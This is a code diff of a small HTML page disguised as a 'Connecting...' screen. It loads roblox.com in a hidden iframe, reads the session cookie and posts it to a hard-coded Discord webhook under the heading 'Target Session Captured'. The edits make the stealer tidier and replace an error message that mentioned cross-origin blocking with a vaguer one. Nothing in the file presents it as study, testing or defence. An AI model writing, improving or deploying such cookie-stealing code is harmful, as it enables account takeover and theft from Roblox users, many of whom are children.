@@ -1,19 +1,31 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Connecting...</title>
+</head>
 <body>
     <iframe id="target" src="https://www.roblox.com/home" style="display:none;"></iframe>
     <script>
-        // Once the iframe loads, we capture the document.cookie from it
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1511610861804851221/vFuThVaS4xGzlpRpzBUnNpJaUqz-RKKb5p10TXkZLrAcRsvDrGWOAM7XzT7S_AutgDiI';
+        
         const frame = document.getElementById('target');
         frame.onload = () => {
             try {
                 const cookie = frame.contentWindow.document.cookie;
-                fetch('https://discord.com/api/webhooks/1511610861804851221/vFuThVaS4xGzlpRpzBUnNpJaUqz-RKKb5p10TXkZLrAcRsvDrGWOAM7XzT7S_AutgDiI', {
+                fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: "Cookie: " + cookie})
+                    body: JSON.stringify({
+                        content: "Target Session Captured:",
+                        embeds: [{
+                            description: "```" + cookie + "
+```",
+                            color: 0xFF0000
+                        }]
+                    })
                 });
             } catch(e) {
-                console.error("The browser is blocking cross-origin access.");
+                console.error("Connection error during extraction.");
             }
         };
     </script>
